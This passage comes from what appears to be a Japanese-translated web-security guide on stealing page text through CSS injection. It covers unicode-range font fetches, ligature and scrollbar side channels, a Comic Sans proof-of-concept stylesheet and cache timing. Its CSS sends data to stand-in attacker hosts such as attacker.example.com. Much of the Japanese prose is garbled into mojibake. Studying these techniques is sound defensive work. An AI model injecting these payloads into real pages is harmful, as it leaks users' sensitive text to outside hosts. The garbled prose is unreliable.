3. **ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚¢ã‚¯ãƒ†ã‚£ãƒ™ãƒ¼ã‚·ãƒ§ãƒ³ã®å¿…è¦æ€§**: STTFã¯å‹•ä½œã™ã‚‹ãŸã‚ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚¢ã‚¯ãƒ†ã‚£ãƒ™ãƒ¼ã‚·ãƒ§ãƒ³ã‚¸ã‚§ã‚¹ãƒãƒ£ãƒ¼ã‚’å¿…è¦ã¨ã—ã€ã¤ã¾ã‚Šæ‚ªç”¨ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒé–‹å§‹ã—ãŸãƒŠãƒ“ã‚²ãƒ¼ã‚·ãƒ§ãƒ³ã‚’é€šã˜ã¦ã®ã¿å¯èƒ½ã§ã™ã€‚ã“ã®è¦ä»¶ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ã‚·ãƒ§ãƒ³ãªã—ã«æ”»æ’ƒãŒè‡ªå‹•åŒ–ã•ã‚Œã‚‹ãƒªã‚¹ã‚¯ã‚’å¤§å¹…ã«è»½æ¸›ã—ã¾ã™ã€‚ãã‚Œã«ã‚‚ã‹ã‹ã‚ã‚‰ãšã€ãƒ–ãƒ­ã‚°æŠ•ç¨¿ã®è‘—è€…ã¯ã€æ”»æ’ƒã®è‡ªå‹•åŒ–ã‚’å®¹æ˜“ã«ã™ã‚‹ç‰¹å®šã®æ¡ä»¶ã‚„ãƒã‚¤ãƒ‘ã‚¹ï¼ˆä¾‹ï¼šã‚½ãƒ¼ã‚·ãƒ£ãƒ«ã‚¨ãƒ³ã‚¸ãƒ‹ã‚¢ãƒªãƒ³ã‚°ã€ä¸€èˆ¬çš„ãªãƒ–ãƒ©ã‚¦ã‚¶æ‹¡å¼µæ©Ÿèƒ½ã¨ã®ã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ã‚·ãƒ§ãƒ³ï¼‰ã‚’æŒ‡æ‘˜ã—ã¦ã„ã¾ã™ã€‚

ã“ã‚Œã‚‰ã®ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã¨æ½œåœ¨çš„ãªè„†å¼±æ€§ã‚’èªè­˜ã™ã‚‹ã“ã¨ã¯ã€ã‚¦ã‚§ãƒ–ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’ç¶­æŒã—ã€ãã®ã‚ˆã†ãªæ‚ªç”¨çš„æˆ¦è¡“ã‹ã‚‰å®ˆã‚‹ãŸã‚ã®éµã§ã™ã€‚

è©³ç´°ã«ã¤ã„ã¦ã¯ã€å…ƒã®å ±å‘Šã‚’ç¢ºèªã—ã¦ãã ã•ã„: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

ã“ã®æŠ€è¡“ã‚’ä½¿ç”¨ã—ãŸ[**CTFã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ã“ã¡ã‚‰ã§ç¢ºèªã§ãã¾ã™**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb)ã€‚

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

ç‰¹å®šã®unicodeå€¤ã«å¯¾ã—ã¦**å¤–éƒ¨ãƒ•ã‚©ãƒ³ãƒˆã‚’æŒ‡å®šã™ã‚‹ã“ã¨ãŒã§ã**ã€ãã®unicodeå€¤ãŒãƒšãƒ¼ã‚¸ã«å­˜åœ¨ã™ã‚‹å ´åˆã«ã®ã¿**åé›†ã•ã‚Œã¾ã™**ã€‚ä¾‹ãˆã°ï¼š
```html
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```
When you access this page, Chrome and Firefox fetch "?A" and "?B" because text node of sensitive-information contains "A" and "B" characters. But Chrome and Firefox do not fetch "?C" because it does not contain "C". This means that we have been able to read "A" and "B".

### ãƒ†ã‚­ã‚¹ãƒˆãƒãƒ¼ãƒ‰ã®æŠ½å‡º (I): ãƒªã‚¬ãƒãƒ£ <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**å‚è€ƒæ–‡çŒ®:** [Wykradanie danych w Å›wietnym stylu â€“ czyli jak wykorzystaÄ‡ CSS-y do atakÃ³w na webaplikacjÄ™](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

ã“ã®æŠ€è¡“ã¯ã€ãƒ•ã‚©ãƒ³ãƒˆãƒªã‚¬ãƒãƒ£ã‚’åˆ©ç”¨ã—ã¦ãƒãƒ¼ãƒ‰ã‹ã‚‰ãƒ†ã‚­ã‚¹ãƒˆã‚’æŠ½å‡ºã—ã€å¹…ã®å¤‰åŒ–ã‚’ç›£è¦–ã™ã‚‹ã“ã¨ã‚’å«ã¿ã¾ã™ã€‚ãƒ—ãƒ­ã‚»ã‚¹ã¯ä»¥ä¸‹ã®ã„ãã¤ã‹ã®ã‚¹ãƒ†ãƒƒãƒ—ã‹ã‚‰æˆã‚Šã¾ã™ï¼š

1. **ã‚«ã‚¹ã‚¿ãƒ ãƒ•ã‚©ãƒ³ãƒˆã®ä½œæˆ**:
- SVGãƒ•ã‚©ãƒ³ãƒˆã¯ã€2æ–‡å­—ã®ã‚·ãƒ¼ã‚±ãƒ³ã‚¹ã‚’è¡¨ã™ã‚°ãƒªãƒ•ã«å¤§ããªå¹…ã‚’è¨­å®šã™ã‚‹`horiz-adv-x`å±æ€§ã‚’æŒã¤ã‚°ãƒªãƒ•ã§ä½œæˆã•ã‚Œã¾ã™ã€‚
- ä¾‹ SVGã‚°ãƒªãƒ•: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`ã€ã“ã“ã§ "XY" ã¯2æ–‡å­—ã®ã‚·ãƒ¼ã‚±ãƒ³ã‚¹ã‚’ç¤ºã—ã¾ã™ã€‚
- ã“ã‚Œã‚‰ã®ãƒ•ã‚©ãƒ³ãƒˆã¯ã€fontforgeã‚’ä½¿ç”¨ã—ã¦woffå½¢å¼ã«å¤‰æ›ã•ã‚Œã¾ã™ã€‚

2. **å¹…ã®å¤‰åŒ–ã®æ¤œå‡º**:
- CSSã‚’ä½¿ç”¨ã—ã¦ãƒ†ã‚­ã‚¹ãƒˆãŒæŠ˜ã‚Šè¿”ã•ãªã„ã‚ˆã†ã«ã—ï¼ˆ`white-space: nowrap`ï¼‰ã€ã‚¹ã‚¯ãƒ­ãƒ¼ãƒ«ãƒãƒ¼ã®ã‚¹ã‚¿ã‚¤ãƒ«ã‚’ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºã—ã¾ã™ã€‚
- æ˜ç¢ºã«ã‚¹ã‚¿ã‚¤ãƒ«ã•ã‚ŒãŸæ°´å¹³ã‚¹ã‚¯ãƒ­ãƒ¼ãƒ«ãƒãƒ¼ã®å‡ºç¾ã¯ã€ç‰¹å®šã®ãƒªã‚¬ãƒãƒ£ã€ã—ãŸãŒã£ã¦ç‰¹å®šã®æ–‡å­—ã‚·ãƒ¼ã‚±ãƒ³ã‚¹ãŒãƒ†ã‚­ã‚¹ãƒˆã«å­˜åœ¨ã™ã‚‹ã“ã¨ã‚’ç¤ºã™æŒ‡æ¨™ï¼ˆã‚ªãƒ©ã‚¯ãƒ«ï¼‰ã¨ã—ã¦æ©Ÿèƒ½ã—ã¾ã™ã€‚
- é–¢é€£ã™ã‚‹CSS:
```css
body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://attacker.com/?leak); }
```

3. **ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆãƒ—ãƒ­ã‚»ã‚¹**:
- **ã‚¹ãƒ†ãƒƒãƒ—1**: å¹…ã®å¤§ãã„æ–‡å­—ãƒšã‚¢ç”¨ã®ãƒ•ã‚©ãƒ³ãƒˆãŒä½œæˆã•ã‚Œã¾ã™ã€‚
- **ã‚¹ãƒ†ãƒƒãƒ—2**: å¤§ããªå¹…ã®ã‚°ãƒªãƒ•ï¼ˆæ–‡å­—ãƒšã‚¢ã®ãƒªã‚¬ãƒãƒ£ï¼‰ãŒæç”»ã•ã‚Œã‚‹ã¨ãã«æ¤œå‡ºã™ã‚‹ãŸã‚ã«ã€ã‚¹ã‚¯ãƒ­ãƒ¼ãƒ«ãƒãƒ¼ã‚’åˆ©ç”¨ã—ãŸãƒˆãƒªãƒƒã‚¯ãŒä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
- **ã‚¹ãƒ†ãƒƒãƒ—3**: ãƒªã‚¬ãƒãƒ£ã‚’æ¤œå‡ºã™ã‚‹ã¨ã€æ¤œå‡ºã•ã‚ŒãŸãƒšã‚¢ã‚’å«ã‚€3æ–‡å­—ã®ã‚·ãƒ¼ã‚±ãƒ³ã‚¹ã‚’è¡¨ã™æ–°ã—ã„ã‚°ãƒªãƒ•ãŒç”Ÿæˆã•ã‚Œã€å‰ã¾ãŸã¯å¾Œã®æ–‡å­—ãŒè¿½åŠ ã•ã‚Œã¾ã™ã€‚
- **ã‚¹ãƒ†ãƒƒãƒ—4**: 3æ–‡å­—ã®ãƒªã‚¬ãƒãƒ£ã®æ¤œå‡ºãŒè¡Œã‚ã‚Œã¾ã™ã€‚
- **ã‚¹ãƒ†ãƒƒãƒ—5**: ãƒ—ãƒ­ã‚»ã‚¹ã¯ç¹°ã‚Šè¿”ã•ã‚Œã€ãƒ†ã‚­ã‚¹ãƒˆå…¨ä½“ãŒå¾ã€…ã«æ˜ã‚‰ã‹ã«ãªã‚Šã¾ã™ã€‚

4. **æœ€é©åŒ–**:
- `<meta refresh=...`ã‚’ä½¿ç”¨ã—ãŸç¾åœ¨ã®åˆæœŸåŒ–æ–¹æ³•ã¯æœ€é©ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚
- ã‚ˆã‚ŠåŠ¹ç‡çš„ãªã‚¢ãƒ—ãƒ­ãƒ¼ãƒã¯ã€CSSã®`@import`ãƒˆãƒªãƒƒã‚¯ã‚’åˆ©ç”¨ã—ã€ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã®ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã‚’å‘ä¸Šã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### ãƒ†ã‚­ã‚¹ãƒˆãƒãƒ¼ãƒ‰ã®æŠ½å‡º (II): ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒ•ã‚©ãƒ³ãƒˆã‚’ä½¿ç”¨ã—ãŸæ–‡å­—ã‚»ãƒƒãƒˆã®æ¼æ´©ï¼ˆå¤–éƒ¨ã‚¢ã‚»ãƒƒãƒˆã‚’å¿…è¦ã¨ã—ãªã„ï¼‰ <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**å‚è€ƒæ–‡çŒ®:** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

ã“ã®ãƒˆãƒªãƒƒã‚¯ã¯ã“ã®[**Slackersã‚¹ãƒ¬ãƒƒãƒ‰**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with\_single\_css\_injection/)ã§å…¬é–‹ã•ã‚Œã¾ã—ãŸã€‚ãƒ†ã‚­ã‚¹ãƒˆãƒãƒ¼ãƒ‰ã§ä½¿ç”¨ã•ã‚Œã‚‹æ–‡å­—ã‚»ãƒƒãƒˆã¯ã€ãƒ–ãƒ©ã‚¦ã‚¶ã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã‚‹**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒ•ã‚©ãƒ³ãƒˆ**ã‚’ä½¿ç”¨ã—ã¦æ¼æ´©ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼šå¤–éƒ¨ã¾ãŸã¯ã‚«ã‚¹ã‚¿ãƒ ãƒ•ã‚©ãƒ³ãƒˆã¯å¿…è¦ã‚ã‚Šã¾ã›ã‚“ã€‚

ã“ã®æ¦‚å¿µã¯ã€ã‚¢ãƒ‹ãƒ¡ãƒ¼ã‚·ãƒ§ãƒ³ã‚’åˆ©ç”¨ã—ã¦`div`ã®å¹…ã‚’å¾ã€…ã«æ‹¡å¤§ã—ã€1æ–‡å­—ãšã¤ãƒ†ã‚­ã‚¹ãƒˆã®ã€Œã‚µãƒ•ã‚£ãƒƒã‚¯ã‚¹ã€éƒ¨åˆ†ã‹ã‚‰ã€Œãƒ—ãƒ¬ãƒ•ã‚£ãƒƒã‚¯ã‚¹ã€éƒ¨åˆ†ã«ç§»è¡Œã•ã›ã‚‹ã“ã¨ã«åŸºã¥ã„ã¦ã„ã¾ã™ã€‚ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã¯ã€ãƒ†ã‚­ã‚¹ãƒˆã‚’2ã¤ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã«åˆ†å‰²ã—ã¾ã™ï¼š

1. **ãƒ—ãƒ¬ãƒ•ã‚£ãƒƒã‚¯ã‚¹**: åˆæœŸè¡Œã€‚
2. **ã‚µãƒ•ã‚£ãƒƒã‚¯ã‚¹**: æ¬¡ã®è¡Œã€‚

æ–‡å­—ã®é·ç§»æ®µéšã¯æ¬¡ã®ã‚ˆã†ã«è¡¨ç¤ºã•ã‚Œã¾ã™ï¼š

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**


ã“ã®é·ç§»ä¸­ã«ã€**unicode-rangeãƒˆãƒªãƒƒã‚¯**ãŒä½¿ç”¨ã•ã‚Œã¦æ–°ã—ã„æ–‡å­—ãŒãƒ—ãƒ¬ãƒ•ã‚£ãƒƒã‚¯ã‚¹ã«åŠ ã‚ã‚‹ãŸã³ã«è­˜åˆ¥ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã¯ã€ãƒ•ã‚©ãƒ³ãƒˆã‚’Comic Sansã«åˆ‡ã‚Šæ›¿ãˆã‚‹ã“ã¨ã§é”æˆã•ã‚Œã€Comic Sansã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒ•ã‚©ãƒ³ãƒˆã‚ˆã‚Šã‚‚æ˜ã‚‰ã‹ã«é«˜ã„ãŸã‚ã€å‚ç›´ã‚¹ã‚¯ãƒ­ãƒ¼ãƒ«ãƒãƒ¼ãŒãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã¾ã™ã€‚ã“ã®ã‚¹ã‚¯ãƒ­ãƒ¼ãƒ«ãƒãƒ¼ã®å‡ºç¾ã¯ã€ãƒ—ãƒ¬ãƒ•ã‚£ãƒƒã‚¯ã‚¹ã«æ–°ã—ã„æ–‡å­—ãŒå­˜åœ¨ã™ã‚‹ã“ã¨ã‚’é–“æ¥çš„ã«ç¤ºã—ã¾ã™ã€‚

ã“ã®æ–¹æ³•ã¯ã€ãƒ¦ãƒ‹ãƒ¼ã‚¯ãªæ–‡å­—ãŒç¾ã‚Œã‚‹ã¨ãã«æ¤œå‡ºã‚’å¯èƒ½ã«ã—ã¾ã™ãŒã€ã©ã®æ–‡å­—ãŒç¹°ã‚Šè¿”ã•ã‚Œã¦ã„ã‚‹ã‹ã‚’ç‰¹å®šã™ã‚‹ã“ã¨ã¯ã§ããšã€ç¹°ã‚Šè¿”ã—ãŒç™ºç”Ÿã—ãŸã“ã¨ã ã‘ã‚’ç¤ºã—ã¾ã™ã€‚

{% hint style="info" %}
åŸºæœ¬çš„ã«ã€**unicode-rangeã¯æ–‡å­—ã‚’æ¤œå‡ºã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™**ãŒã€å¤–éƒ¨ãƒ•ã‚©ãƒ³ãƒˆã‚’èª­ã¿è¾¼ã‚€ã“ã¨ã¯æœ›ã¾ã—ããªã„ãŸã‚ã€åˆ¥ã®æ–¹æ³•ã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚\
**æ–‡å­—**ãŒ**è¦‹ã¤ã‹ã£ãŸ**ã¨ãã€ãã‚Œã¯**äº‹å‰ã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚ŒãŸComic Sansãƒ•ã‚©ãƒ³ãƒˆ**ãŒ**ä¸ãˆã‚‰ã‚Œ**ã€æ–‡å­—ãŒ**å¤§ãããªã‚Š**ã€**ã‚¹ã‚¯ãƒ­ãƒ¼ãƒ«ãƒãƒ¼ãŒãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œ**ã€**è¦‹ã¤ã‹ã£ãŸæ–‡å­—ãŒæ¼æ´©ã—ã¾ã™**ã€‚
{% endhint %}

Check the code extracted from the PoC:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### ãƒ†ã‚­ã‚¹ãƒˆãƒãƒ¼ãƒ‰ã®æŠ½å‡º (III): ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒ•ã‚©ãƒ³ãƒˆã§ã®æ–‡å­—ã‚»ãƒƒãƒˆã®æ¼æ´©ï¼ˆå¤–éƒ¨ã‚¢ã‚»ãƒƒãƒˆã‚’å¿…è¦ã¨ã—ãªã„ï¼‰ <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**å‚è€ƒ:** ã“ã‚Œã¯[ã“ã®æ›¸ãè¾¼ã¿ã§ã®å¤±æ•—ã—ãŸè§£æ±ºç­–ã¨ã—ã¦è¨€åŠã•ã‚Œã¦ã„ã¾ã™](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

ã“ã®ã‚±ãƒ¼ã‚¹ã¯å‰ã®ã‚±ãƒ¼ã‚¹ã¨éå¸¸ã«ä¼¼ã¦ã„ã¾ã™ãŒã€ä»Šå›ã¯ç‰¹å®šã®**æ–‡å­—ã‚’ä»–ã®æ–‡å­—ã‚ˆã‚Šå¤§ããã™ã‚‹ç›®çš„ã¯ã€ãƒœãƒƒãƒˆã«æŠ¼ã•ã‚Œãªã„ãƒœã‚¿ãƒ³ã‚„èª­ã¿è¾¼ã¾ã‚Œãªã„ç”»åƒã®ã‚ˆã†ãªä½•ã‹ã‚’éš ã™ã“ã¨ã§ã™**ã€‚ã—ãŸãŒã£ã¦ã€ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ï¼ˆã¾ãŸã¯ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã®æ¬ å¦‚ï¼‰ã‚’æ¸¬å®šã—ã€ç‰¹å®šã®æ–‡å­—ãŒãƒ†ã‚­ã‚¹ãƒˆå†…ã«å­˜åœ¨ã™ã‚‹ã‹ã©ã†ã‹ã‚’çŸ¥ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### ãƒ†ã‚­ã‚¹ãƒˆãƒãƒ¼ãƒ‰ã®æŠ½å‡º (III): ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã‚¿ã‚¤ãƒŸãƒ³ã‚°ã«ã‚ˆã‚‹æ–‡å­—ã‚»ãƒƒãƒˆã®æ¼æ´©ï¼ˆå¤–éƒ¨ã‚¢ã‚»ãƒƒãƒˆã‚’å¿…è¦ã¨ã—ãªã„ï¼‰ <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**å‚è€ƒ:** ã“ã‚Œã¯[ã“ã®æ›¸ãè¾¼ã¿ã§ã®å¤±æ•—ã—ãŸè§£æ±ºç­–ã¨ã—ã¦è¨€åŠã•ã‚Œã¦ã„ã¾ã™](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

ã“ã®ã‚±ãƒ¼ã‚¹ã§ã¯ã€åŒã˜ã‚ªãƒªã‚¸ãƒ³ã‹ã‚‰å½ã®ãƒ•ã‚©ãƒ³ãƒˆã‚’èª­ã¿è¾¼ã‚€ã“ã¨ã§ã€ãƒ†ã‚­ã‚¹ãƒˆã«æ–‡å­—ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’æ¼æ´©ã•ã›ã‚‹ã“ã¨ã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
ã‚‚ã—ä¸€è‡´ãŒã‚ã‚Œã°ã€**ãƒ•ã‚©ãƒ³ãƒˆã¯ `/static/bootstrap.min.css?q=1` ã‹ã‚‰èª­ã¿è¾¼ã¾ã‚Œã¾ã™**ã€‚æˆåŠŸè£ã«èª­ã¿è¾¼ã¾ã‚Œã‚‹ã“ã¨ã¯ã‚ã‚Šã¾ã›ã‚“ãŒã€**ãƒ–ãƒ©ã‚¦ã‚¶ã¯ãã‚Œã‚’ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã™ã‚‹ã¯ãšã§ã™**ã€‚ã‚­ãƒ£ãƒƒã‚·ãƒ¥ãŒãªãã¦ã‚‚ã€**304 not modified** ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ãŒã‚ã‚‹ãŸã‚ã€**ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã¯ä»–ã®ã‚‚ã®ã‚ˆã‚Šã‚‚é€Ÿããªã‚‹ã¯ãšã§ã™**ã€‚

ã—ã‹ã—ã€ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã•ã‚ŒãŸãƒ¬ã‚¹ãƒãƒ³ã‚¹ã¨éã‚­ãƒ£ãƒƒã‚·ãƒ¥ã®ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã®æ™‚é–“å·®ãŒååˆ†ã§ãªã„å ´åˆã€ã“ã‚Œã¯å½¹ã«ç«‹ã¡ã¾ã›ã‚“ã€‚ä¾‹ãˆã°ã€è‘—è€…ã¯æ¬¡ã®ã‚ˆã†ã«è¿°ã¹ã¦ã„ã¾ã™ï¼šã—ã‹ã—ã€ãƒ†ã‚¹ãƒˆã®çµæœã€æœ€åˆã®å•é¡Œã¯é€Ÿåº¦ãŒã‚ã¾ã‚Šå¤‰ã‚ã‚‰ãªã„ã“ã¨ã§ã‚ã‚Šã€äºŒã¤ç›®ã®å•é¡Œã¯ãƒœãƒƒãƒˆãŒ `disk-cache-size=1` ãƒ•ãƒ©ã‚°ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã“ã¨ã§ã€ã“ã‚Œã¯æœ¬å½“ã«è€ƒæ…®ã•ã‚Œã¦ã„ã¾ã™ã€‚

